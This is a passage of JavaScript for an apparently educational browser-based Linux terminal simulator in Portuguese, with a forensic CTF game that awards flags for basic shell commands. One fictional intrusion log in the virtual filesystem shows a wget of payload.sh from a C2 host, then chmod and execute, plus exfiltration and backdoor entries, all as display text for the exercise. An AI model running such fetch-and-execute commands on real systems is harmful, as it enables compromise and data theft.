    'config.enc':  { type:'file', content:`[ENCRYPTED - EVIDENCIA FORENSE]\nk3y: 0x4F2A1B8C\nc2_ip: 10.0.0.1\nc2_port: 4444\n\n[Instrucao forense: mova este arquivo para /tmp/analise/ com mv]\n\n╔══════════════════════════════════════════╗\n║  FLAG{MV_3V1D3NC14_F0R3NS3_2}          ║\n╚══════════════════════════════════════════╝\n\nFlag 2/10 capturada! [Mover Evidencia]\nProxima missao: navegue ate /home/hacker e explore os arquivos ocultos com ls -a` },
  }};
  FS['/'].children.etc.children.hosts = { type:'file', content:`127.0.0.1   localhost\n127.0.1.1   linux\n::1         localhost\n\n# === ENTRADA SUSPEITA ===\n10.0.0.1    c2.servidor-malicioso.internal\n\n╔══════════════════════════════════════════╗\n║  FLAG{H0ST_F1L3_C2_3NTR4D4_REDE_6}     ║\n╚══════════════════════════════════════════╝\n\nFlag 6/10 capturada! [Rede]\nProxima missao: navegue ate /var/log e leia o arquivo intruso.log` };
  FS['/'].children.var.children.log.children['intruso.log'] = { type:'file', content:`[2026-04-15 03:17:01] ALERT: Login SSH root de 10.0.0.1\n[2026-04-15 03:17:45] CMD: wget http://c2.servidor-malicioso.internal/payload.sh\n[2026-04-15 03:18:02] CMD: chmod +x payload.sh && ./payload.sh\n[2026-04-15 03:19:01] PLANTED: /opt/missao/backdoor.sh\n[2026-04-15 03:19:30] EXFIL: 47MB enviados para 10.0.0.1:4444\n\n╔══════════════════════════════════════════╗\n║  FLAG{L0G_F0R3NS3_D3T3CT4D0_7777}      ║\n╚══════════════════════════════════════════╝\n\nFlag 7/10 capturada! [Log Forense]\nProxima missao: navegue ate /tmp/esconderijo e procure arquivos ocultos com ls -a` };
  FS['/'].children.tmp.children.esconderijo = { type:'dir', children:{
    '.flag_oculta': { type:'file', content:`Voce encontrou o esconderijo!\nls -a foi necessario para chegar aqui.\n\n╔══════════════════════════════════════════╗\n║  FLAG{OCULTO_LS_A_3SCOND1DO_8888}      ║\n╚══════════════════════════════════════════╝\n\nFlag 8/10 capturada! [Arquivo Oculto]\nProxima missao: navegue ate /home/hacker e leia o arquivo cifra.txt` },
    'isca.txt': { type:'file', content:`Isso nao e a flag... continue procurando!\nArquivos ocultos comecam com ponto (.)` },
  }};
  FS['/'].children.root = { type:'dir', children:{
    'flag_secreta.txt': { type:'file', content:`=== ARQUIVO SECRETO DO ROOT ===\nVoce precisou de sudo para chegar aqui.\n\n╔══════════════════════════════════════════╗\n║  FLAG{R00T_4CC3SS_SUP3RM4N_1010}       ║\n╚══════════════════════════════════════════╝\n\nFlag 10/10 capturada! [Root Flag]\n=== MISSAO COMPLETA! === PARABENS, AGENTE!` },
  }};
}

function resetVirtualFilesystem() {
  FS['/'] = cloneNode(BASE_FS['/']);
  state.cwd = state.env.HOME;
  state.prevDir = null;
  updatePrompt();
}

const CTF_ORDER = ['flag1','flag2','flag3','flag4','flag5','flag6','flag7','flag8','flag9','flag10'];

function nextCTFKey() {
  return CTF_ORDER.find(key => !CTF.flags[key].found) || null;
}

function canCaptureCTFKey(key) {
  return !CTF.active || key === nextCTFKey();
}

function warnCTFOutOfOrder(key) {
  const next = nextCTFKey();
  if (!next || key === next) return;
  print(`CTF: esta evidencia pertence a uma etapa futura. Complete primeiro: ${CTF.flags[next].label}.`, 'warning');
}

function flagKeyInText(text) {
  const found = Object.entries(CTF.flagStrings).find(([flagStr]) => String(text).includes(flagStr));
  return found ? found[1] : null;
}

function canRevealCTFNode(node, path) {
  if (!CTF.active || !node || node.type !== 'file') return true;
  const key = flagKeyInText(node.content || '');
  if (!key || CTF.flags[key].found) return true;
  if (key === 'flag2') {
    print('CTF: esta evidencia precisa ser movida para /tmp/analise com mv para concluir esta etapa.', 'warning');
    return false;
  }
  if (canCaptureCTFKey(key)) return true;
  warnCTFOutOfOrder(key);
  return false;
}

// Detecta cp (flag1) e mv (flag2) no CTF
function checkCTFMvCp(cmd, args) {
  if (!CTF.active) return;
  // Flag 1 — cp: copiar notas_hacker.txt para /tmp/
  if (cmd === 'cp' && !CTF.flags.flag1.found) {
    const src = resolvePath(state.cwd, args[0] || '');
    const dst = resolvePath(state.cwd, args[1] || '');
    if (src.includes('notas_hacker') && dst.includes('/tmp/')) {
      if (!canCaptureCTFKey('flag1')) { warnCTFOutOfOrder('flag1'); return; }
      setTimeout(() => {
        printBlank();
        print('Relatorio copiado com sucesso! Evidencia original preservada.', 'success');
        print('╔══════════════════════════════════════════╗', 'success');
        print('║  FLAG{CP_R3L4T0R10_PR3S3RV4D0_1}      ║', 'success');
        print('╚══════════════════════════════════════════╝', 'success');
        print('Flag 1/10 capturada! [Copiar Relatorio]', 'success');
        print('Proxima missao: mova /opt/missao/config.enc para /tmp/analise/ usando mv', 'info');
        captureFlag('flag1');
      }, 150);
    }
  }
  // Flag 2 — mv: mover config.enc de /opt/missao para /tmp/
  if (cmd === 'mv' && !CTF.flags.flag2.found) {
    const src = resolvePath(state.cwd, args[0] || '');
    const dst = resolvePath(state.cwd, args[1] || '');
    if (src.includes('config.enc') && (dst === '/tmp/analise' || dst.startsWith('/tmp/analise/'))) {
      if (!canCaptureCTFKey('flag2')) { warnCTFOutOfOrder('flag2'); return; }
      setTimeout(() => {
        printBlank();
        print('Evidencia movida com sucesso para analise forense!', 'success');
        print('╔══════════════════════════════════════════╗', 'success');
        print('║  FLAG{MV_3V1D3NC14_F0R3NS3_2}          ║', 'success');
        print('╚══════════════════════════════════════════╝', 'success');
        print('Flag 2/10 capturada! [Mover Evidencia]', 'success');
        print('Proxima missao: navegue ate /home/hacker e explore os arquivos ocultos com ls -a', 'info');
        captureFlag('flag2');
      }, 150);
    }
  }
}

function checkFlagInText(text) {
  for (const [flagStr, key] of Object.entries(CTF.flagStrings)) {
    if (text.includes(flagStr) && !CTF.flags[key].found) {
      if (!canCaptureCTFKey(key)) { warnCTFOutOfOrder(key); return; }
      setTimeout(() => captureFlag(key), 200);
    }
  }
}

function captureFlag(key) {
  if (!CTF.flags[key] || CTF.flags[key].found) return;
  if (!canCaptureCTFKey(key)) { warnCTFOutOfOrder(key); return; }
  CTF.flags[key].found = true;
  CTF.score += CTF.flags[key].pts;
  updateCTFHUD();
  showFlagNotification(CTF.flags[key]);
  setTimeout(() => {
    printBlank();
    print('╔══════════════════════════════════════════════════════╗','success');
    print(`║  🚩 FLAG CAPTURADA: <span style="color:var(--amber)">${CTF.flags[key].label}</span>`,'success');
    print(`║  +${CTF.flags[key].pts} pontos  →  Total: ${CTF.score} pts`,'success');
    print('╚══════════════════════════════════════════════════════╝','success');
    printBlank();
    // Exibe o status automaticamente para o usuario acompanhar o progresso
    printCTFStatus();
    const rem = CTF_ORDER.filter(key => !CTF.flags[key].found).length;
    if (rem === 0) { setTimeout(showCTFVictory, 1500); }
    else print(`<span class="output-dim">Continue explorando! Use ctf hint se precisar de ajuda.</span>`,'output-dim');
    printBlank();
  }, 300);
}

function showFlagNotification(f) {
  const notif = document.getElementById('flag-notification');
  document.getElementById('notif-text').textContent = `${f.label}`;
  document.getElementById('notif-pts').textContent   = `+${f.pts} pts`;
  notif.classList.add('show');
  setTimeout(() => notif.classList.remove('show'), 3000);
}

function updateCTFHUD() {
  document.getElementById('ctf-score-display').textContent = `${CTF.score} pts`;
  const row = document.getElementById('ctf-flags-row');
  row.innerHTML = '';
  Object.entries(CTF.flags).filter(([,f]) => !f.bonus).forEach(([,f]) => {
    const badge = document.createElement('span');
    badge.className = 'ctf-flag-badge' + (f.found?' found':'');
    badge.innerHTML = `<span class="flag-icon">${f.found?'🚩':'⬜'}</span>${escapeHtml(f.label)}`;
    row.appendChild(badge);
  });
}

function showCTFVictory() {
  const elapsed = Math.round((Date.now()-CTF.startTime)/1000);
  const victory = document.getElementById('ctf-victory');
  const scoreEl = document.getElementById('victory-score');
  scoreEl.textContent = `Pontuacao Final: ${CTF.score} pts`;
  scoreEl.classList.remove('score-boost');
  document.getElementById('victory-time').textContent  = `Tempo: ${Math.floor(elapsed/60)}m ${elapsed%60}s | Dicas: ${CTF.hintsUsed}`;
  document.getElementById('bonus-flag-input').value = '';
  document.getElementById('bonus-flag-input').disabled = CTF.bonusAttempted || !!CTF.flags.flag11.found;
  document.getElementById('bonus-flag-submit').disabled = CTF.bonusAttempted || !!CTF.flags.flag11.found;
  document.getElementById('bonus-flag-message').textContent = '';
  document.getElementById('bonus-flag-panel').classList.toggle('solved', !!CTF.flags.flag11.found);
  document.getElementById('bonus-flag-panel').classList.toggle('attempted', CTF.bonusAttempted);
  victory.classList.remove('glitching', 'bonus-unlocked');
  victory.classList.add('show');
  if (!CTF.bonusAttempted && !CTF.flags.flag11.found) {
    setTimeout(() => document.getElementById('bonus-flag-input').focus(), 100);
  }
}

function cipherBonusText(text) {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
  return String(text).split('').map((ch, i) => {
    if (ch === ' ') return ' ';
    return alphabet[(ch.charCodeAt(0) + i * 7) % alphabet.length];
  }).join('');
}

function animateCipherInput(input, original, onDone) {
  const encrypted = cipherBonusText(original || ' ');
  const frames = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_#@$%';
  let index = 0;
  input.classList.add('ciphering');
  const tick = setInterval(() => {
    const chars = encrypted.split('');
    for (let i = index; i < chars.length; i++) {
      chars[i] = frames[(Date.now() + i * 13) % frames.length];
    }
    input.value = chars.join('');
    index++;
    if (index > encrypted.length) {
      clearInterval(tick);
      input.value = encrypted;
      input.classList.remove('ciphering');
      onDone?.();
    }
  }, 55);
}

function submitBonusFlag() {
  const input = document.getElementById('bonus-flag-input');
  const msg = document.getElementById('bonus-flag-message');
  const victory = document.getElementById('ctf-victory');
  const value = input.value.trim();
  const submit = document.getElementById('bonus-flag-submit');
  if (CTF.bonusAttempted || CTF.flags.flag11.found) {
    msg.textContent = CTF.flags.flag11.found ? 'Flag bonus ja validada.' : 'Tentativa bonus ja utilizada.';
    return;
  }
  if (!value) {
    msg.textContent = 'Digite uma flag antes de validar. Esta tentativa e unica.';
    return;
  }

  CTF.bonusAttempted = true;
  input.disabled = true;
  submit.disabled = true;
  document.getElementById('bonus-flag-panel').classList.add('attempted');
  msg.textContent = 'Cifrando tentativa...';

  animateCipherInput(input, value, () => {
    if (value !== 'FLAG{Y0U_5H0ULD_N0T_B3_H3R3}') {
      msg.textContent = 'Tentativa utilizada. A flag informada foi cifrada e arquivada.';
      return;
    }

    CTF.flags.flag11.found = true;
    CTF.score += CTF.flags.flag11.pts;
    updateCTFHUD();
    const scoreEl = document.getElementById('victory-score');
    scoreEl.textContent = `Pontuacao Final: ${CTF.score} pts`;
    scoreEl.classList.add('score-boost');
    msg.innerHTML = '<span class="bonus-points-pop">+500 pts</span><span>Você certamente está em um nível mais avançado...</span>';
    victory.classList.add('glitching');
    setTimeout(() => {
      victory.classList.remove('glitching');
      victory.classList.add('bonus-unlocked');
      document.getElementById('bonus-flag-panel').classList.add('solved');
      scoreEl.classList.remove('score-boost');
    }, 1300);
  });
}

// ══════════════════════════════════════════════════════
// DICAS CTF — formato estruturado
// ══════════════════════════════════════════════════════
function giveCTFHint() {
  const entry = Object.entries(CTF.flags).find(([,f]) => !f.found && !f.bonus);
  if (!entry) { print('Todas as flags ja foram encontradas!', 'success'); return; }
  const [key, f] = entry;
  CTF.hintsUsed++;
  CTF.score = Math.max(0, CTF.score - 10);
  updateCTFHUD();

  // Quebra texto longo em multiplas linhas prefixadas
  function wrap(text, prefix, max) {
    const words = text.split(' ');
    const lines = [];
    let cur = prefix;
    for (const w of words) {
      if (cur.length - prefix.length + w.length + 1 > max && cur !== prefix) {
        lines.push(cur.trimEnd());
        cur = prefix + w + ' ';
      } else {
        cur += w + ' ';
      }
    }
    if (cur.trim() !== prefix.trim() && cur.trim().length > 0) lines.push(cur.trimEnd());
    return lines;
  }

  const BAR = '+---------------------------------------------------------+';
  const SEP = '|                                                         |';

  printBlank();
  print(BAR, 'separator');
  print(`| DICA #${CTF.hintsUsed} -- <span style="color:var(--amber);font-weight:700">${escapeHtml(f.label)}</span>  <span class="output-dim">(-10 pts | Score: ${CTF.score} pts)</span>`, 'output');
  print(BAR, 'separator');

  print('|', 'separator');
  print('|  <span class="hl-flag">O QUE FAZER:</span>', 'output');
  wrap(f.what, '|    ', 52).forEach(l => print(escapeHtml(l), 'output'));

  print('|', 'separator');
  print('|  <span class="hl-flag">POR QUE ESTE COMANDO:</span>', 'output');
  wrap(f.why, '|    ', 52).forEach(l => print(escapeHtml(l), 'output-dim'));

  print('|', 'separator');
  print('|  <span class="hl-flag">PROXIMO PASSO:</span>', 'output');
  wrap(f.next, '|    ', 52).forEach(l => print(escapeHtml(l), 'success'));

  print('|', 'separator');
  print('|  <span class="hl-flag">DICA DO COMANDO (veja o menu lateral):</span>', 'output');
  wrap(f.hint, '|    ', 52).forEach(l => print(escapeHtml(l), 'info'));

  print('|', 'separator');
  print(BAR, 'separator');
  printBlank();
}

function startCTF() {
  CTF.active = true; CTF.score = 0; CTF.startTime = Date.now(); CTF.hintsUsed = 0;
  CTF.bonusAttempted = false;
  Object.values(CTF.flags).forEach(f => f.found = false);
  resetVirtualFilesystem();
  injectCTFFilesystem();
  document.getElementById('ctf-hud').classList.add('active');
  updateCTFHUD();
  clearTerminal();
  const lines = [
    '+==========================================================+',
    '|',
    '|   [CTF]  MISSAO: INFILTRACAO SIGMA',
    '|',
    '+==========================================================+',
    '',
    'TRANSMISSAO RECEBIDA -- CLASSIFICADO: ULTRA SECRETO',
    '',
    'Agente, um servidor critico foi comprometido.',
    'Realize uma analise forense e encontre as 10 flags.',
    '',
    '-----------------------------------------------------------',
    'PONTO DE PARTIDA:',
    '  Leia o briefing: cd /home/hacker  -->  cat briefing.txt',
    '  Comece copiando o arquivo de notas: cp notas_hacker.txt /tmp/relatorio.txt',
    '  Explore: /home/hacker  /opt/missao  /etc  /var/log  /tmp  /root',
    '-----------------------------------------------------------',
    '',
    'FLAGS E PONTUACAO:',
    '  [ 1] Copiar Relatorio 150 pts  --  cp notas_hacker.txt para /tmp/',
    '  [ 2] Mover Evidencia  150 pts  --  mv config.enc para /tmp/analise/',
    '  [ 3] Reconhecimento   100 pts  --  arquivos ocultos em /home/hacker',
    '  [ 4] Permissoes       200 pts  --  cat backdoor.sh em /opt/missao',
    '  [ 5] Processos        200 pts  --  ps aux',
    '  [ 6] Rede             200 pts  --  /etc/hosts',
    '  [ 7] Log Forense      250 pts  --  /var/log/intruso.log',
    '  [ 8] Arquivo Oculto   250 pts  --  ls -a /tmp/esconderijo',
    '  [ 9] Criptografia     300 pts  --  /home/hacker/cifra.txt',
    '  [10] Root Flag        350 pts  --  /root/ (requer sudo)',
    '',
    'ctf hint = dica detalhada (-10pts) | ctf status = progresso',
    '',
    'BOA SORTE, AGENTE.',
    '',
  ];
  let i = 0;
  (function next() {
    if (i >= lines.length) return;
    const l = lines[i];
    const cls = l.startsWith('+') ? 'separator' : l === '' ? 'blank' : l.startsWith('|') ? 'separator' : 'output';
    print(l, cls); i++;
    setTimeout(next, 28);
  })();
}

function stopCTF(silent) {
  CTF.active = false;
  document.getElementById('ctf-hud').classList.remove('active');
  document.getElementById('ctf-victory').classList.remove('show');
  if (!silent) {
    printBlank();
    print('Modo jogo encerrado.','warning');
    print(`Pontuacao: <span class="hl-cmd">${CTF.score} pts</span> | Flags: ${CTF_ORDER.filter(key=>CTF.flags[key].found).length}/10`,'output');
    printBlank();
  }
  resetVirtualFilesystem();
}

function printCTFStatus() {
  const elapsed = Math.round((Date.now()-CTF.startTime)/1000);
  printBlank();
  print('============== STATUS DA MISSAO ==============','separator');
  print(`Tempo: <span class="hl-value">${Math.floor(elapsed/60)}m ${elapsed%60}s</span>  |  Score: <span class="hl-cmd">${CTF.score} pts</span>  |  Dicas: ${CTF.hintsUsed}`,'output');
  printBlank();
  CTF_ORDER.forEach((key,i)=>{
    const f = CTF.flags[key];
    const icon = f.found ? '[X]' : '[ ]';
    const status = f.found ? '<span style="color:var(--green)">CAPTURADA</span>' : '<span style="color:var(--gray)">pendente</span>';
    print(`  ${icon} Flag ${i+1}: <span class="hl-value">${escapeHtml(f.label).padEnd(18)}</span> ${status}  [${f.found?'+'+f.pts:f.pts+' pts'}]`,'output');
  });
  const found = CTF_ORDER.filter(key=>CTF.flags[key].found).length;
  printBlank();
  print(`Progresso: [<span class="hl-cmd">${'#'.repeat(found)}${'.'.repeat(10-found)}</span>] ${found}/10`,'output');
  print('=============================================','separator');
  printBlank();
}

function cmdCtf(args) {
  const sub = args[0];
  if (!sub || sub==='help') {
    printBlank();
    print('╔══════════════════════════════════════════════════════════╗','separator');
    print('║              MODO JOGO — CTF INFILTRACAO SIGMA            ║','success');
    print('╚══════════════════════════════════════════════════════════╝','separator');
    printBlank();
    print('<span class="hl-cmd">ctf start</span>   — Iniciar o cenario CTF','output');
    print('<span class="hl-cmd">ctf status</span>  — Ver flags encontradas e pontuacao','output');
    print('<span class="hl-cmd">ctf hint</span>    — Dica estruturada com proximo passo (-10 pts)','output');
    print('<span class="hl-cmd">ctf reset</span>   — Reiniciar o cenario','output');
    print('<span class="hl-cmd">ctf stop</span>    — Encerrar o modo jogo','output');
    printBlank();
    if (!CTF.active) print('<span class="output-dim">Execute ctf start para comecar a missao!</span>','output-dim');
    return;
  }
  if (sub==='start')  { if(CTF.active){print('Modo jogo ja ativo. Use ctf status.','warning');return;} startCTF(); return; }
  if (sub==='status') { if(!CTF.active){print('Modo jogo nao ativo.','warning');return;} printCTFStatus(); return; }
  if (sub==='hint')   { if(!CTF.active){print('Modo jogo nao ativo.','warning');return;} giveCTFHint(); return; }
  if (sub==='reset')  { stopCTF(true); setTimeout(startCTF, 400); return; }
  if (sub==='stop')   { if(!CTF.active){print('Modo jogo nao esta ativo.','warning');return;} stopCTF(false); return; }
  print(`ctf: subcomando desconhecido '${args[0]}'. Use ctf help.`,'error');
}

// ══════════════════════════════════════════════════════
// PIPE E REDIRECT
// ══════════════════════════════════════════════════════
function collectCommandOutput(input, stdin) {
  const { cmd, flags, args, raw } = parseCommand(input);
  if (cmd === 'echo') return args.map(a => a.replace(/\$(\w+)/g, (_, v) => state.env[v] || '')).join(' ');
  if (cmd === 'pwd') return state.cwd;
  if (cmd === 'ls' || cmd === 'll' || cmd === 'la') {
    const listFlags = cmd === 'll' ? ['-la'] : cmd === 'la' ? ['-a'] : flags;
    const showAll = listFlags.some(f => f.includes('a'));
    const path = args[0] ? resolvePath(state.cwd, args[0]) : state.cwd;
    if (path.startsWith('/root')) return null;
    const dir = listDir(path);
    if (!dir) return null;
    return dir.filter(e => showAll || !e.name.startsWith('.')).map(e => e.name + (e.type === 'dir' ? '/' : '')).join('\n');
  }
  if (cmd === 'cat') {
    const chunks = [];
    for (const arg of args) {
      const path = resolvePath(state.cwd, arg);
      const node = getNode(path);
      if (!node || node.type === 'dir' || (path.startsWith('/root')) || !canRevealCTFNode(node, path)) return null;
      chunks.push(node.content);
    }
    return chunks.join('\n');
  }
  if (cmd === 'grep') {
    const pattern = args[0];
    if (!pattern || stdin == null) return null;
    const ci = flags.includes('-i');
    const invert = flags.includes('-v');
    const countOnly = flags.includes('-c');
    let rx;
    try { rx = new RegExp(pattern, ci ? 'i' : ''); } catch { return null; }
    const lines = String(stdin).split('\n').filter(line => invert ? !rx.test(line) : rx.test(line));
    return countOnly ? String(lines.length) : lines.join('\n');
  }
  if (cmd === 'wc') {
    const text = stdin == null ? '' : String(stdin);
    if (flags.includes('-l')) return String(text ? text.split('\n').filter(Boolean).length : 0);
    if (flags.includes('-w')) return String(text.trim() ? text.trim().split(/\s+/).length : 0);
    if (flags.includes('-c')) return String(new Blob([text]).size);
    const lines = text ? text.split('\n').filter(Boolean).length : 0;
    const words = text.trim() ? text.trim().split(/\s+/).length : 0;
    return `${String(lines).padStart(7)} ${String(words).padStart(7)} ${String(new Blob([text]).size).padStart(7)}`;
  }
  if (cmd === 'head') {
    const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
    return stdin == null ? null : String(stdin).split('\n').slice(0, n).join('\n');
  }
  if (cmd === 'tail') {
    const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
    return stdin == null ? null : String(stdin).split('\n').slice(-n).join('\n');
  }
  return null;
}

function handlePipe(input) {
  const parts = input.split(' | ').map(s => s.trim()).filter(Boolean);
  let output = collectCommandOutput(parts[0], null);
  if (output == null) { print('pipe: comando inicial nao suportado nesta simulacao', 'error'); return; }
  for (let i = 1; i < parts.length; i++) {
    output = collectCommandOutput(parts[i], output);
    if (output == null) { print(`pipe: comando '${parts[i]}' nao suportado nesta simulacao`, 'error'); return; }
  }
  String(output).split('\n').forEach(line => print(escapeHtml(line), 'output'));
}

function handleRedirect(input) {
  const append = input.includes('>>');
  const [left, right] = input.split(append?'>>':'>').map(s=>s.trim());
  const { parent, name } = getParentAndNode(resolvePath(state.cwd, right));
  if (!parent || parent.type !== 'dir') { print(`bash: ${right}: Diretorio nao encontrado`,'error'); return; }
  const captured = left.includes(' | ')
    ? left.split(' | ').map(s => s.trim()).filter(Boolean).reduce((out, part, idx) => idx === 0 ? collectCommandOutput(part, null) : collectCommandOutput(part, out), null)
    : collectCommandOutput(left, null);
  if (captured == null) { print(`bash: nao foi possivel redirecionar a saida de '${left}'`, 'error'); return; }
  if (append && parent.children[name]) parent.children[name].content += '\n'+captured;
  else parent.children[name] = { type:'file', content:captured };
  print(`<span class="output-dim">Saida gravada em '${right}'</span>`,'output-dim');
}

// ══════════════════════════════════════════════════════
// AUTOCOMPLETE
// ══════════════════════════════════════════════════════
function autocomplete(partial) {
  const parts = partial.split(' ');
  if (parts.length===1) {
    const m = Object.keys(COMMANDS_DB).filter(c=>c.startsWith(partial));
    if (m.length===1) return m[0];
    if (m.length>1) print(m.join('  '),'output-dim');
    return partial;
  }
  const last = parts[parts.length-1];
  const dirPath = last.includes('/') ? resolvePath(state.cwd, last.split('/').slice(0,-1).join('/')||'/') : state.cwd;
  const prefix = last.split('/').pop();
  const dir = listDir(dirPath);
  if (!dir) return partial;
  const m = dir.filter(e=>e.name.startsWith(prefix));
  if (m.length===1) { parts[parts.length-1]=(last.includes('/')?last.slice(0,last.lastIndexOf('/')+1):'')+m[0].name+(m[0].type==='dir'?'/':''); return parts.join(' '); }
  if (m.length>1) print(m.map(e=>e.name+(e.type==='dir'?'/':'')).join('  '),'output-dim');
  return partial;
}

// ══════════════════════════════════════════════════════
// DESPACHANTE PRINCIPAL
// ══════════════════════════════════════════════════════
function executeCommand(input) {
  const trimmed = input.trim();
  if (!trimmed) return;
  if (state.history[state.history.length-1] !== trimmed) state.history.push(trimmed);
  state.historyIndex = -1;
  printCmd(trimmed);
  if (trimmed.includes(' | '))  { handlePipe(trimmed); return; }
  if (trimmed.includes('>'))    { handleRedirect(trimmed); return; }
  const { cmd, flags, args, raw } = parseCommand(trimmed);
  switch (cmd) {
    case 'ls':       cmdLs(flags,args,false); break;
    case 'cd':       cmdCd(args);             break;
    case 'pwd':      cmdPwd();                break;
    case 'mkdir':    cmdMkdir(flags,args);    break;
    case 'rm':       cmdRm(flags,args);       break;
    case 'cp':       if (cmdCp(flags,args)) checkCTFMvCp('cp',args); break;
    case 'mv':       if (cmdMv(flags,args)) checkCTFMvCp('mv',args); break;
    case 'touch':    cmdTouch(args);          break;
    case 'file':     cmdFile(args);           break;
    case 'cat':      cmdCat(flags,args,false); break;
    case 'echo':     cmdEcho(flags,args);     break;
    case 'grep':     cmdGrep(flags,args);     break;
    case 'find':     cmdFind(flags,raw);      break;
    case 'which':    cmdWhich(args);          break;
    case 'chmod':    cmdChmod(args);          break;
    case 'chown':    cmdChown(args);          break;
    case 'ps':       cmdPs(flags,args);       break;
    case 'kill':     cmdKill(flags,args);     break;
    case 'top':      cmdTop();                break;
    case 'df':       cmdDf(flags);            break;
    case 'du':       cmdDu(flags,args);       break;
    case 'free':     cmdFree(flags);          break;
    case 'tar':      cmdTar(flags,args);      break;
    case 'head':     cmdHead(flags,args,raw); break;
    case 'tail':     cmdTail(flags,args,raw); break;
    case 'sort':     cmdSort(flags,args);     break;
    case 'wc':       cmdWc(flags,args);       break;
    case 'less':     cmdLess(args);           break;
    case 'man':      cmdMan(args);            break;
    case 'history':  cmdHistory(args);        break;
    case 'sudo':     cmdSudo(flags,args);     break;
    case 'apt':      cmdApt(flags,args);      break;
    case 'ssh':      cmdSsh(args);            break;
    case 'scp':      cmdScp(args);            break;
    case 'wget':     cmdWget(flags,args);     break;
    case 'curl':     cmdCurl(flags,args);     break;
    case 'ping':     cmdPing(flags,args);     break;
    case 'ifconfig': cmdIfconfig();           break;
    case 'ip':       cmdIp(args);             break;
    case 'env':      cmdEnv();                break;
    case 'whoami':   cmdWhoami();             break;
    case 'id':       cmdId(args);             break;
    case 'hostname': cmdHostname(flags);      break;
    case 'uptime':   cmdUptime();             break;
    case 'uname':    cmdUname(flags);         break;
    case 'date':     cmdDate(raw);            break;
    case 'help':     cmdHelp(args);           break;
    case 'clear':    clearTerminal();         break;
    case 'ctf':      cmdCtf(args);            break;
    case 'll':       cmdLs(['-la'],args,false); break;
    case 'la':       cmdLs(['-a'],args,false); break;
    case 'exit':
      print('Saindo do terminal...','output-dim');
      print('<span class="output-dim">Recarregue a pagina para uma nova sessao.</span>','output');
      break;
    default:
      if (cmd.startsWith('$')) print(escapeHtml(state.env[cmd.slice(1)]||''),'output');
      else { print(`${cmd}: comando nao encontrado`,'error'); print(`<span class="output-dim">Dica: tente 'help'</span>`,'output-dim'); }
  }
}

// ══════════════════════════════════════════════════════
// MENU LATERAL
// ══════════════════════════════════════════════════════
function buildMenu() {
  const menu = document.getElementById('menu');
  menu.innerHTML = '';
  Object.entries(CATEGORIES).forEach(([catName,{cmds}],idx) => {
    const icon = CATEGORY_ICONS[catName] || '';
    const cat = document.createElement('div');
    cat.className = 'menu-category'; cat.dataset.cat = catName;
    const header = document.createElement('div');
    header.className = 'menu-category-header';
    header.innerHTML = `<span>${icon} ${catName}</span><span class="menu-chevron">&#9658;</span>`;
    header.setAttribute('role','button');
    header.setAttribute('aria-expanded', idx<3?'true':'false');
    const itemsDiv = document.createElement('div');
    itemsDiv.className = 'menu-items';
    cmds.forEach(cmdName => {
      const db = COMMANDS_DB[cmdName]; if (!db) return;
      const item = document.createElement('div');
      item.className = 'menu-item'; item.dataset.cmd = cmdName;
      item.innerHTML = `<div class="menu-item-inner"><span class="menu-item-cmd">${cmdName}</span><span class="menu-item-desc">${db.desc}</span></div>`;
      item.addEventListener('click', () => { inputEl.value = db.examples[0]||cmdName; updateCursorDisplay(); inputEl.focus(); showTooltip(item,db,cmdName); });
      item.addEventListener('mouseenter', () => showTooltip(item,db,cmdName));
      item.addEventListener('mouseleave', hideTooltip);
      itemsDiv.appendChild(item);
    });
    header.addEventListener('click', () => {
      const open = header.classList.toggle('open');
      itemsDiv.classList.toggle('open',open);
      header.setAttribute('aria-expanded',String(open));
    });
    cat.appendChild(header); cat.appendChild(itemsDiv); menu.appendChild(cat);
  });
}

const tooltip = document.getElementById('cmd-tooltip');
function showTooltip(el, db, cmdName) {
  tooltip.innerHTML = `<div class="tooltip-cmd">$ ${cmdName}</div><div class="tooltip-desc">${db.desc}</div>${db.tip?`<div class="tooltip-example"> ${db.tip}</div>`:''}`;
  const rect = el.getBoundingClientRect();
  tooltip.style.left = (rect.right+10)+'px';
  tooltip.style.top  = Math.min(rect.top, window.innerHeight-120)+'px';
  tooltip.classList.add('visible'); tooltip.removeAttribute('aria-hidden');
}
function hideTooltip() { tooltip.classList.remove('visible'); tooltip.setAttribute('aria-hidden','true'); }

document.getElementById('search-input').addEventListener('input', function() {
  const q = this.value.toLowerCase().trim();
  document.querySelectorAll('.menu-category').forEach(cat => {
    let vis = false;
    cat.querySelectorAll('.menu-item').forEach(item => {
      const cmd=item.dataset.cmd, db=COMMANDS_DB[cmd];
      const m = !q || cmd.includes(q)||(db&&db.desc.toLowerCase().includes(q));
      item.classList.toggle('hidden',!m); if(m) vis=true;
    });
    cat.style.display = q&&!vis?'none':'';
    if(q&&vis){cat.querySelector('.menu-items').classList.add('open');cat.querySelector('.menu-category-header').classList.add('open');}
  });
});

// ══════════════════════════════════════════════════════
// EVENTOS DO TECLADO
// ══════════════════════════════════════════════════════
function handleKey(e) {
  switch (e.key) {
    case 'Enter': {
      e.preventDefault?.();
      const v = inputEl.value;
      inputEl.value = '';
      updateCursorDisplay();
      // Fecha o teclado virtual em mobile antes de executar
      if (isMobileViewport()) inputEl.blur();
      executeCommand(v);
      break;
    }
    case 'ArrowUp': {
      e.preventDefault?.();
      if (!state.history.length) break;
      if (state.historyIndex === -1) state.historyIndex = state.history.length - 1;
      else if (state.historyIndex > 0) state.historyIndex--;
      inputEl.value = state.history[state.historyIndex] || '';
      setTimeout(updateCursorDisplay, 0);
      break;
    }
    case 'ArrowDown': {
      e.preventDefault?.();
      if (state.historyIndex === -1) break;
      state.historyIndex++;
      inputEl.value = state.historyIndex >= state.history.length
        ? (state.historyIndex = -1, '')
        : state.history[state.historyIndex];
      setTimeout(updateCursorDisplay, 0);
      break;
    }
    case 'Tab': {
      e.preventDefault?.();
      inputEl.value = autocomplete(inputEl.value);
      setTimeout(updateCursorDisplay, 0);
      break;
    }
    case 'l': {
      if (e.ctrlKey) { e.preventDefault?.(); clearTerminal(); }
      break;
    }
    case 'c': {
      if (e.ctrlKey) {
        e.preventDefault?.();
        printCmd(inputEl.value + '^C');
        inputEl.value = '';
        state.historyIndex = -1;
        updateCursorDisplay();
      }
      break;
    }
  }
}

inputEl.addEventListener('keydown', handleKey);

// Captura tambem o evento input (alguns teclados mobile so disparam input, nao keydown)
inputEl.addEventListener('input', () => {
  state.historyIndex = -1;
